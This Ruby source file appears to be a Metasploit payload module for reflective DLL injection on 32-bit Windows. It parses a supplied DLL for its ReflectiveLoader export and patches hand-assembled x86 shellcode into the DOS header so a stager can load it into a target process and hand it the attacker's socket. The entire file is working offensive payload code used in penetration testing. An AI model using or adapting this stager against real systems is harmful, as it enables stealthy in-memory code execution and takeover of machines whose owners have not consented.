
require 'msf/core'
require 'rex/peparsey'

module Msf


###
#
# Common module stub for ARCH_X86 payloads that make use of Reflective DLL Injection.
#
###


module Payload::Windows::ReflectiveDllInject

	include Msf::Payload::Windows

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Reflective Dll Injection',
			'Version'       => '$Revision$',
			'Description'   => 'Inject a Dll via a reflective loader',
			'Author'        => [ 'sf' ],
			'References'    => [ [ 'URL', 'http://www.harmonysecurity.com/ReflectiveDllInjection.html' ] ],
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'PayloadCompat' => 
				{ 
					'Convention' => 'sockedi'
				},
			'Stage'         => 
				{ 
					'Offsets' => 
						{ 
							'EXITFUNC' => [ 33, 'V' ] 
						}, 
					'Payload' => "" 
				}
			))
      
		register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
	end

	def library_path
		datastore['DLL']
	end

	def stage_payload
		dll    = ""
		offset = 0
    
		begin
			File.open( library_path, "rb" ) { |f| dll += f.read }

			pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
      		
			pe.exports.entries.each do |entry|
				if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
					offset = pe.rva_to_file_offset( entry.rva )
					break
				end
			end

			raise "Can't find an exported ReflectiveLoader function!" if offset == 0 
		rescue
			print_error( "Failed to read and parse Dll file: #{$!}" )
			return
		end
		
		exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration
		
		bootstrap = "\x4D" +                            # dec ebp             ; M
					"\x5A" +                            # pop edx             ; Z
					"\xE8\x00\x00\x00\x00" +            # call 0              ; call next instruction
					"\x5B" +                            # pop ebx             ; get our location (+7)
					"\x52" +                            # push edx            ; push edx back
					"\x45" +                            # inc ebp             ; restore ebp
					"\x55" +                            # push ebp            ; save ebp
					"\x89\xE5" +                        # mov ebp, esp        ; setup fresh stack frame
					"\x81\xC3" + [offset-7].pack( "V" ) + # add ebx, 0x???????? ; add offset to ReflectiveLoader
					"\xFF\xD3" +                        # call ebx            ; call ReflectiveLoader
					"\x89\xC3" +                        # mov ebx, eax        ; save DllMain for second call
					"\x57" +                            # push edi            ; our socket
					"\x68\x04\x00\x00\x00" +            # push 0x4            ; signal we have attached
					"\x50" +                            # push eax            ; some value for hinstance
					"\xFF\xD0" +                        # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
					"\x68" + exit_funk +                # push 0x????????     ; our EXITFUNC placeholder
					"\x68\x05\x00\x00\x00" +            # push 0x5            ; signal we have detached
					"\x50" +                            # push eax            ; some value for hinstance
					"\xFF\xD3"                          # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
					
		# sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
		if( bootstrap.length > 62 )
			print_error( "Reflective Dll Injection (x86) generated an oversized bootstrap!" )
			return
		end
		
		# patch the bootstrap code into the dll's DOS header...
		dll[ 0, bootstrap.length ] = bootstrap
		
		# return our stage to be loaded by the intermediate stager
		return dll
  end
  
end

end 

